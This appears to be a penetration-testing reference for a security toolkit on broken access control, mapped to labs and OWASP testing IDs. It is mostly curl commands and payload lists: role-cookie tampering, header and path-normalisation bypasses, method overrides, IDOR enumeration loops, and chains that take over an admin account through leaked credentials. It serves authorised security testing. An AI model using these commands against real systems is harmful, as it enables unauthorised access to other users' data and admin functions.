---
id: PS-AUTHZ
category: Access control vulnerabilities
lab_count: 13
wstg_refs: [WSTG-ATHZ-02, WSTG-ATHZ-03, WSTG-ATHZ-04]
---

# Access Control: Attack Technique Reference

Access control determines whether a user is permitted to perform a requested action or access a requested resource. Broken access control allows attackers to bypass authorization checks, access other users' data, perform privileged actions, or escalate from a low-privilege account to full administrative control. These flaws are consistently among the most critical web application vulnerabilities because they directly lead to unauthorized data access and system compromise.

---

## 1. Detection

### 1A. Role and Privilege Mapping

Before testing access control, build a privilege lattice that maps every role to its permitted actions. Without this, you cannot distinguish authorized from unauthorized access.

**Step 1: Identify all roles**
```
# Log in as each available user and observe the UI
# Common role hierarchy (highest to lowest):
admin / superadmin / root
manager / moderator / editor
user / member / subscriber
guest / anonymous / unauthenticated
```

**Step 2: Capture per-role endpoint access**
For each role, crawl the application and record which endpoints return 200 vs. 403/404. Compare responses across roles to identify role-gated functionality:
```bash
# As admin — capture all accessible endpoints
curl -sk -b "session=ADMIN_TOKEN" https://target.com/admin -o /dev/null -w '%{http_code}'
curl -sk -b "session=ADMIN_TOKEN" https://target.com/admin/users -o /dev/null -w '%{http_code}'
curl -sk -b "session=ADMIN_TOKEN" https://target.com/admin/delete?user=carlos -o /dev/null -w '%{http_code}'

# As regular user — attempt the same endpoints
curl -sk -b "session=USER_TOKEN" https://target.com/admin -o /dev/null -w '%{http_code}'
curl -sk -b "session=USER_TOKEN" https://target.com/admin/users -o /dev/null -w '%{http_code}'
curl -sk -b "session=USER_TOKEN" https://target.com/admin/delete?user=carlos -o /dev/null -w '%{http_code}'

# Unauthenticated — attempt the same
curl -sk https://target.com/admin -o /dev/null -w '%{http_code}'
```

**Step 3: Identify interesting discrepancies**
- Endpoints returning 200 for low-privilege users that should be restricted
- Endpoints returning 302 (redirect to login) but still leaking data in the response body
- Endpoints returning different content for the same user ID with different session tokens

### 1B. Admin Panel Discovery

Locate administrative functionality through multiple discovery vectors:

```bash
# Check robots.txt for disallowed admin paths
curl -sk https://target.com/robots.txt

# Common admin paths
/admin
/admin/
/administrator
/admin-panel
/admin-console
/management
/manager
/_admin
/wp-admin
/cpanel
/dashboard
/backend

# Scan JavaScript files for admin URL references
curl -sk https://target.com/ | grep -oP '(href|src|action)="[^"]*"' | grep -i admin
curl -sk https://target.com/resources/js/app.js | grep -oP '"\/[a-zA-Z0-9_\-\/]+"' | sort -u
```

### 1C. ID Parameter Enumeration

Identify all parameters that reference user-specific or object-specific resources:

```
# User-specific parameters
?id=, ?uid=, ?user_id=, ?userId=, ?user=, ?account=, ?account_id=
?profile=, ?profile_id=, ?customer=, ?customer_number=
?username=, ?name=, ?email=

# Object-specific parameters
?order_id=, ?orderId=, ?doc=, ?document_id=, ?file=, ?report=
?invoice=, ?transaction=, ?message_id=, ?ticket=, ?case=

# Path-based references
/api/users/{id}
/api/users/{id}/profile
/api/orders/{id}
/api/documents/{id}/download
/users/{username}/settings
```

### 1D. Response Comparison Technique

For any protected endpoint, compare responses across these four states:

| State | Method | What to look for |
|-------|--------|------------------|
| Admin session | `-b "session=ADMIN_TOKEN"` | Baseline expected response |
| Regular user session | `-b "session=USER_TOKEN"` | Should differ from admin |
| Other user session | `-b "session=OTHER_USER_TOKEN"` | Should not see first user's data |
| No session | No cookie header | Should be rejected or redirected |

If a low-privilege state returns the same data as a high-privilege state, access control is broken.

---

## 2. Techniques

### 2A. Unprotected Admin Functionality

Administrative pages that lack any access control check, relying solely on obscurity (unknown URL) to prevent unauthorized access.

**Direct URL access:**
```bash
# Try common admin paths without authentication
curl -sk https://target.com/admin
curl -sk https://target.com/administrator-panel
curl -sk https://target.com/admin-panel
curl -sk https://target.com/management

# Try with trailing slash variation
curl -sk https://target.com/admin/
```

**Discovery via robots.txt:**
```bash
curl -sk https://target.com/robots.txt
# Look for: Disallow: /admin-panel
# Then access: curl -sk https://target.com/admin-panel
```

**Discovery via JavaScript source:**
```bash
# Fetch homepage and all linked JS files
curl -sk https://target.com/ | grep -oP 'src="(/[^"]+\.js)"'
# Read each JS file and search for admin paths
curl -sk https://target.com/resources/js/app.js | grep -oP "'\/[^']*admin[^']*'"
# Look for conditional blocks: if(isAdmin) { window.location = '/admin-abc123' }
```

**What to look for in JS:**
- Path strings containing `admin`, `dashboard`, `panel`, `manage`
- Conditional navigation based on role variables
- Route definitions revealing hidden endpoints

> Lab refs: PS-AUTHZ-01, PS-AUTHZ-02

### 2B. Parameter-Based Access Control

Applications that store the user's role or privilege level in a user-controllable location: cookies, hidden form fields, query parameters, or JSON request bodies. The server trusts these values without independent verification.

**Cookie manipulation:**
```bash
# Observe cookies set at login
curl -sk -D- -X POST -d "username=wiener&password=peter" https://target.com/login
# Look for: Set-Cookie: Admin=false; or Set-Cookie: role=user;

# Tamper the cookie value
curl -sk -b "Admin=true" https://target.com/admin
curl -sk -b "role=admin" https://target.com/admin
curl -sk -b "isAdmin=1" https://target.com/admin/delete?username=carlos
```

**Query parameter manipulation:**
```bash
# If the application uses URL parameters for role checks
curl -sk "https://target.com/home?admin=true"
curl -sk "https://target.com/home?role=admin"
curl -sk "https://target.com/home?access_level=administrator"
```

**JSON body role injection:**
```bash
# When updating profile, inject a role field
curl -sk -X POST -H "Content-Type: application/json" \
  -b "session=USER_TOKEN" \
  -d '{"email":"user@test.com","roleid":2}' \
  https://target.com/api/profile

# Variants: "role":"admin", "isAdmin":true, "access_level":0, "privilege":"superuser"
```

**Mass assignment / property injection:**
Applications that bind request parameters directly to internal objects may allow injecting privilege-related fields alongside legitimate fields. Send extra fields in profile update or registration requests and observe whether the server stores them.

> Lab refs: PS-AUTHZ-03, PS-AUTHZ-04

### 2C. Platform Misconfiguration — URL Override Headers

When the application restricts access based on URL matching at a front-end layer (reverse proxy, load balancer, or framework), non-standard headers can override the actual URL that the back-end processes.

**X-Original-URL bypass:**
```bash
# Normal request blocked by front-end rule:
curl -sk https://target.com/admin
# → 403 Forbidden

# Bypass: request / but override with X-Original-URL
curl -sk -H "X-Original-URL: /admin" https://target.com/
# → 200 OK (back-end processes /admin, front-end checked /)

# With action parameters
curl -sk -H "X-Original-URL: /admin/delete" "https://target.com/?username=carlos"
```

**X-Rewrite-URL bypass:**
```bash
curl -sk -H "X-Rewrite-URL: /admin" https://target.com/
curl -sk -H "X-Rewrite-URL: /admin/delete?username=carlos" https://target.com/
```

**Detection:** Send a request to a nonexistent path with `X-Original-URL: /known-valid-path`. If you get 200 instead of 404, the header is being processed.

> Lab refs: PS-AUTHZ-10

### 2D. Method-Based Access Control Bypass

Applications that enforce authorization only for certain HTTP methods (e.g., POST) but not for equivalent operations via other methods (GET, PUT, PATCH).

```bash
# Original privileged action (POST, requires admin session):
curl -sk -X POST -b "session=ADMIN_TOKEN" \
  -d "username=carlos&action=upgrade" \
  https://target.com/admin-roles

# Attempt the same action via GET with a regular user session:
curl -sk -X GET -b "session=USER_TOKEN" \
  "https://target.com/admin-roles?username=carlos&action=upgrade"

# Try alternative methods
curl -sk -X PUT -b "session=USER_TOKEN" \
  -d "username=carlos&action=upgrade" \
  https://target.com/admin-roles

curl -sk -X PATCH -b "session=USER_TOKEN" \
  -d '{"username":"carlos","action":"upgrade"}' \
  https://target.com/admin-roles
```

**Systematic method enumeration:**
```bash
# For each restricted endpoint, try all standard methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "--- $method ---"
  curl -sk -X $method -b "session=USER_TOKEN" \
    -o /dev/null -w '%{http_code}' \
    https://target.com/admin/action
  echo ""
done
```

> Lab refs: PS-AUTHZ-11

### 2E. URL Matching Discrepancies

Framework-specific normalization differences between the access control layer and the routing layer can allow path-based bypasses.

**Case sensitivity bypass:**
```bash
# If access control blocks /admin but routing is case-insensitive:
curl -sk https://target.com/ADMIN
curl -sk https://target.com/Admin
curl -sk https://target.com/aDmIn
```

**Trailing slash discrepancy:**
```bash
# Some frameworks treat /admin and /admin/ as different routes
curl -sk https://target.com/admin/
curl -sk https://target.com/admin//
```

**Extension appending (Spring useSuffixPatternMatch):**
```bash
# Spring framework may match /admin/deleteUser.anything to /admin/deleteUser
curl -sk https://target.com/admin/deleteUser.json
curl -sk https://target.com/admin/deleteUser.html
curl -sk https://target.com/admin/deleteUser.css
curl -sk https://target.com/admin/deleteUser.anything
```

**Path traversal in URL:**
```bash
# Access control checks /admin prefix, but path normalization resolves traversal
curl -sk https://target.com/public/../admin
curl -sk https://target.com/./admin
curl -sk https://target.com//admin
curl -sk https://target.com/admin;
curl -sk https://target.com/admin%00
curl -sk https://target.com/%2fadmin
```

**Semicolon parameter injection (Tomcat/Java):**
```bash
# Tomcat strips path parameters (;key=value) before routing
curl -sk https://target.com/admin;foo=bar
curl -sk https://target.com/admin;.css
curl -sk https://target.com/admin/delete;.png?username=carlos
```

### 2F. Horizontal Privilege Escalation (IDOR — Same Role, Other Users)

Accessing resources belonging to other users at the same privilege level by manipulating object reference parameters.

**Sequential ID enumeration:**
```bash
# Observe your own account URL
# https://target.com/my-account?id=123
# Try other IDs
curl -sk -b "session=USER_TOKEN" "https://target.com/my-account?id=1"
curl -sk -b "session=USER_TOKEN" "https://target.com/my-account?id=2"
curl -sk -b "session=USER_TOKEN" "https://target.com/my-account?id=124"

# API variant
curl -sk -b "session=USER_TOKEN" https://target.com/api/users/1
curl -sk -b "session=USER_TOKEN" https://target.com/api/users/2
```

**GUID harvesting when IDs are not sequential:**
```bash
# GUIDs are not guessable, but they often leak in other responses

# Check user listings, blog posts, comments, or public profiles
curl -sk https://target.com/blog | grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'

# Check user profile pages for references to other users
curl -sk -b "session=USER_TOKEN" https://target.com/users | grep -oP '"userId":"[^"]*"'

# Check API responses for embedded user references
curl -sk -b "session=USER_TOKEN" https://target.com/api/posts | python3 -c "import sys,json; [print(p.get('authorId','')) for p in json.load(sys.stdin)]"

# Then access the target user's data with the harvested GUID
curl -sk -b "session=USER_TOKEN" "https://target.com/my-account?id=HARVESTED-GUID"
```

**Data leakage in redirects:**
```bash
# Some applications redirect unauthorized users but include sensitive data
# in the response body BEFORE the redirect is processed
curl -sk -D- -b "session=USER_TOKEN" "https://target.com/my-account?id=ADMIN_ID"
# Check: 302 redirect header, but response body contains the admin's data
# The -D- flag shows headers; inspect the body even on 3xx responses
```

> Lab refs: PS-AUTHZ-05, PS-AUTHZ-06, PS-AUTHZ-07

### 2G. Horizontal to Vertical Escalation

Leveraging a horizontal access control flaw to access an administrative user's data, then using that data (password hash, API key, or password change mechanism) to escalate to full administrative access.

**Pattern: IDOR to password disclosure to admin takeover:**
```bash
# Step 1: Discover admin user's ID or username
curl -sk https://target.com/ | grep -i admin
# Or enumerate: /api/users/administrator, /my-account?user=administrator

# Step 2: Access admin's profile page via IDOR
curl -sk -b "session=USER_TOKEN" "https://target.com/my-account?id=administrator"
# Look for: password field pre-filled in HTML (<input type="password" value="...">)
# Or: password hash, API key, reset token in the response body

# Step 3: Extract the credential from the response
# <input type="password" name="password" value="s3cr3t-pa55w0rd">

# Step 4: Log in as admin with the extracted credential
curl -sk -D- -X POST -d "username=administrator&password=s3cr3t-pa55w0rd" \
  https://target.com/login
```

**Pattern: IDOR to API key to privileged action:**
```bash
# Step 1: Access another user's account via IDOR
curl -sk -b "session=USER_TOKEN" https://target.com/api/users/1
# Response: {"username":"administrator","apiKey":"abc123..."}

# Step 2: Use the API key to perform admin actions
curl -sk -H "X-API-Key: abc123..." https://target.com/api/admin/delete-user?user=carlos
```

> Lab refs: PS-AUTHZ-08

### 2H. Insecure Direct Object References (Static Files)

When the application serves user-specific files using predictable file paths or names, an attacker can access other users' files by modifying the filename.

```bash
# Chat transcripts stored as sequential text files
curl -sk https://target.com/static/transcripts/1.txt
curl -sk https://target.com/static/transcripts/2.txt
curl -sk https://target.com/static/transcripts/3.txt

# User-uploaded files with predictable naming
curl -sk https://target.com/uploads/user1/report.pdf
curl -sk https://target.com/uploads/user2/report.pdf

# Database-backed files via sequential ID
curl -sk https://target.com/download?file_id=1
curl -sk https://target.com/download?file_id=2

# Enumerate a range to find all accessible files
for i in $(seq 1 50); do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "https://target.com/static/$i.txt")
  if [ "$code" = "200" ]; then echo "FOUND: $i.txt"; fi
done
```

> Lab refs: PS-AUTHZ-09

### 2I. Multi-Step Process Bypass

Administrative workflows that consist of multiple steps (e.g., confirm action -> verify -> execute) may enforce authorization on the initial steps but not on the final execution step.

```bash
# Observe the admin's multi-step workflow:
# Step 1: POST /admin/upgrade-user (displays confirmation form)
# Step 2: POST /admin/upgrade-user/confirm (asks "are you sure?")
# Step 3: POST /admin/upgrade-user/execute (performs the action)

# The application checks authorization at Step 1 but not Step 3
# Skip directly to Step 3 with a low-privilege session:
curl -sk -X POST -b "session=USER_TOKEN" \
  -d "username=wiener&action=upgrade&confirmed=true" \
  https://target.com/admin/upgrade-user/execute

# Common multi-step patterns to bypass:
# Skip confirmation step entirely
# Replay the final POST with different session cookie
# Submit Step 3 parameters directly without visiting Step 1/2
```

**Detection approach:**
1. As admin, walk through the full multi-step process and capture all requests
2. Identify which request actually performs the state-changing action (usually the last one)
3. Replay that specific request with a regular user's session token
4. If the action succeeds, the intermediate authorization steps are decorative only

> Lab refs: PS-AUTHZ-12

### 2J. Referer-Based Access Control

Applications that use the HTTP Referer header to infer authorization, checking whether the user "came from" an authorized page rather than verifying their actual permissions.

```bash
# Normal admin flow:
# 1. Visit /admin (checks session — admin only)
# 2. Click "upgrade user" — sends:
#    POST /admin/upgrade HTTP/1.1
#    Referer: https://target.com/admin

# Bypass: Forge the Referer header with a low-privilege session
curl -sk -X GET -b "session=USER_TOKEN" \
  -H "Referer: https://target.com/admin" \
  "https://target.com/admin/upgrade?username=wiener&action=upgrade"

# The server sees the Referer is /admin and assumes the user is authorized
```

**Testing approach:**
1. Capture a legitimate admin request to a sub-page
2. Note the Referer header value
3. Replay the request with a regular user session and the same Referer
4. If access is granted, the application relies on Referer-based authorization

> Lab refs: PS-AUTHZ-13

---

## 3. IDOR Testing Methodology

A systematic approach for testing Insecure Direct Object References across an entire application.

### 3A. Identify All Object References

Enumerate every parameter, path segment, and request body field that references a specific object:

```
# Types of references to collect:
1. User IDs: numeric (123), string (carlos), GUID (550e8400-e29b-41d4-a716-446655440000)
2. Object IDs: order_id, document_id, transaction_id, message_id, ticket_id
3. File references: filename, filepath, attachment, download path
4. API path segments: /api/users/{id}, /api/orders/{id}
5. Composite keys: user_id + order_id combinations
```

### 3B. Collect Reference Values

For each identified reference, gather valid values to use in testing:

```
# Your own IDs (from normal application use)
- User ID from profile page or API response
- Order IDs from order history
- Document IDs from document listing

# Other users' IDs (from various sources)
- Blog post author IDs
- Comment user references
- Public profile URLs
- API listing responses
- Leaked in 302 redirect bodies
- Embedded in JavaScript variables
- Present in HTML comments
```

### 3C. Execute IDOR Tests

For each object reference, perform these test cases:

```bash
# Test 1: Access another user's resource (horizontal)
curl -sk -b "session=YOUR_TOKEN" "https://target.com/api/users/OTHER_USER_ID"

# Test 2: Access resource without authentication
curl -sk "https://target.com/api/users/OTHER_USER_ID"

# Test 3: Access resource with different HTTP methods
curl -sk -X GET -b "session=YOUR_TOKEN" "https://target.com/api/users/OTHER_USER_ID"
curl -sk -X PUT -b "session=YOUR_TOKEN" -d '{"email":"evil@test.com"}' "https://target.com/api/users/OTHER_USER_ID"
curl -sk -X DELETE -b "session=YOUR_TOKEN" "https://target.com/api/users/OTHER_USER_ID"

# Test 4: Modify your own request to target another user
# Original: POST /api/orders with body {"user_id":"YOUR_ID","item":"widget"}
# Modified: POST /api/orders with body {"user_id":"OTHER_ID","item":"widget"}
curl -sk -X POST -b "session=YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_id":"OTHER_USER_ID","item":"widget"}' \
  https://target.com/api/orders

# Test 5: Enumerate sequential IDs
for id in $(seq 1 20); do
  resp=$(curl -sk -b "session=YOUR_TOKEN" -w '%{http_code}' -o /tmp/idor_$id.txt "https://target.com/api/orders/$id")
  echo "ID=$id STATUS=$resp"
done

# Test 6: Test with admin/privileged user's ID (vertical)
curl -sk -b "session=USER_TOKEN" "https://target.com/api/users/1"    # admin is often ID 1
curl -sk -b "session=USER_TOKEN" "https://target.com/api/users/administrator"
```

### 3D. Verify Impact

For each successful IDOR, confirm what data is exposed and whether write operations are possible:

```
# Read access: Can you view another user's data?
#   → Record the fields returned (PII, financial data, credentials)

# Write access: Can you modify another user's data?
#   → Test by updating a non-destructive field (e.g., nickname)
#   → NEVER test deletion or destructive operations without explicit permission

# Escalation: Does the IDOR provide a path to higher privilege?
#   → Admin credentials, API keys, or password reset tokens in the response
#   → Ability to change another user's role or permissions
```

---

## 4. Testing Checklist

A per-endpoint systematic checklist for access control testing. Apply every check to every protected endpoint.

### 4A. Authentication Bypass

```
[ ] Remove session cookie entirely — does the endpoint still respond with data?
[ ] Use an expired session token — is it rejected?
[ ] Use a malformed session token (truncated, Base64-corrupted) — is it rejected?
[ ] Remove the Authorization header (for API endpoints using Bearer tokens)
[ ] Send an empty Authorization: Bearer header
```

### 4B. Vertical Privilege Escalation

```
[ ] Access admin-only endpoints with a regular user's session
[ ] Access admin-only endpoints with no session (unauthenticated)
[ ] Swap the session cookie: use a low-privilege session for an admin action
[ ] Try X-Original-URL / X-Rewrite-URL headers to override the path
[ ] Try all HTTP methods (GET, POST, PUT, PATCH, DELETE) on restricted endpoints
[ ] Try URL path variations: case changes, trailing slash, extension appending
[ ] Check for admin parameters: ?admin=true, ?debug=1, ?role=admin in cookies or body
[ ] For JSON APIs: add roleid, isAdmin, access_level fields to legitimate requests
```

### 4C. Horizontal Privilege Escalation (IDOR)

```
[ ] For every endpoint with a user ID parameter: substitute another user's ID
[ ] For every endpoint with an object ID: substitute another object's ID
[ ] Test with sequential IDs (id+1, id-1, id=1)
[ ] Test with admin user ID (often id=1 or username=administrator)
[ ] Check if GUIDs are leaked elsewhere in the application
[ ] Test both GET (read) and POST/PUT/DELETE (write) operations
[ ] Check response body on 302/403 redirects for leaked data
[ ] Test path-based references: /api/users/{other_id}/profile
```

### 4D. Method and Header Manipulation

```
[ ] Change request method: POST→GET, GET→PUT, POST→PATCH
[ ] Add X-Original-URL header with the target admin path
[ ] Add X-Rewrite-URL header with the target admin path
[ ] Spoof the Referer header to an admin page URL
[ ] Try X-Forwarded-For: 127.0.0.1 to simulate local access
[ ] Try X-Custom-IP-Authorization: 127.0.0.1
```

### 4E. Multi-Step and Workflow Bypass

```
[ ] Map the complete workflow (Step 1 → Step 2 → Step 3)
[ ] Identify which step performs the actual action
[ ] Skip directly to the action step with a low-privilege session
[ ] Replay individual steps out of order
[ ] Omit CSRF tokens or confirmation parameters from intermediate steps
```

### 4F. Static File and Object Access

```
[ ] Check for predictable file paths (sequential names, user-prefixed directories)
[ ] Access other users' uploaded files by modifying the path or filename
[ ] Enumerate file IDs: /download?id=1 through /download?id=N
[ ] Check if files are served without authentication from static directories
```

---

## 5. Access Control Bypass Payloads

### 5A. Header-Based Bypasses

```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: localhost
X-Remote-Addr: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

### 5B. Cookie and Parameter Tampering

```
# Cookie values to try
Admin=true
admin=1
role=admin
role=administrator
isAdmin=true
access=admin
privilege=superuser

# Query parameters to try
?admin=true
?debug=1
?role=admin
?access_level=0
?is_admin=1

# JSON body fields to inject alongside legitimate fields
"roleid": 2
"role": "admin"
"isAdmin": true
"access_level": "administrator"
"privilege": 0
"group": "admins"
```

### 5C. Path Manipulation for URL-Based Access Control

```
# Case variations
/ADMIN
/Admin
/aDmIn
/admin/deleteUser
/ADMIN/DELETEUSER

# Trailing characters
/admin/
/admin//
/admin/.
/admin/./
/admin;
/admin%00
/admin%20

# Extension appending (Spring useSuffixPatternMatch)
/admin/deleteUser.json
/admin/deleteUser.html
/admin/deleteUser.css
/admin/deleteUser.anything
/admin/deleteUser.%00

# Path traversal
/public/../admin
/./admin
/anything/../admin/deleteUser

# URL encoding
/%61%64%6d%69%6e         (admin URL-encoded)
/%2fadmin
/admin%2fdeleteUser

# Semicolon path parameters (Java/Tomcat)
/admin;foo=bar
/admin;.css
/admin;.js
/admin/deleteUser;.png?username=carlos
```

### 5D. HTTP Method Override

When the framework supports method override via headers or parameters:

```bash
# Header-based method override
curl -sk -X POST -H "X-HTTP-Method-Override: PUT" https://target.com/api/resource
curl -sk -X POST -H "X-HTTP-Method: DELETE" https://target.com/api/resource
curl -sk -X POST -H "X-Method-Override: PATCH" https://target.com/api/resource

# Parameter-based method override
curl -sk -X POST -d "_method=PUT" https://target.com/api/resource
curl -sk -X POST "https://target.com/api/resource?_method=DELETE"
```

---

## 6. Quick Reference: Access Control Test Matrix

For each endpoint in the application, fill in this matrix:

```
| Endpoint              | Method | Admin 200? | User 200? | NoAuth 200? | IDOR? | Method Bypass? |
|-----------------------|--------|------------|-----------|-------------|-------|----------------|
| /admin                | GET    | Yes        | ?         | ?           | N/A   | ?              |
| /admin/delete         | POST   | Yes        | ?         | ?           | N/A   | ?              |
| /api/users/{id}       | GET    | Yes        | ?         | ?           | ?     | ?              |
| /api/users/{id}       | PUT    | Yes        | ?         | ?           | ?     | ?              |
| /my-account           | GET    | Yes        | Yes       | ?           | ?     | N/A            |
| /api/orders/{id}      | GET    | Yes        | Yes       | ?           | ?     | ?              |
```

**Filling the matrix:**
- "?" cells are your test cases — each one requires a curl request
- "Yes" in User or NoAuth columns for admin-only endpoints = **finding**
- "Yes" in IDOR column = **finding** (user can access other users' data)
- "Yes" in Method Bypass column = **finding** (restricted via POST but accessible via GET)
- Every cell should be tested; no cell should remain "?" after testing is complete
## Rynix workflow

1. `get_technique_guide` for `access-control` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `run_idor_matrix`, `compare_role_response`, `rbac_matrix`, `check_access`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `run_idor_matrix`
- `compare_role_response`
- `rbac_matrix`
- `check_access`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

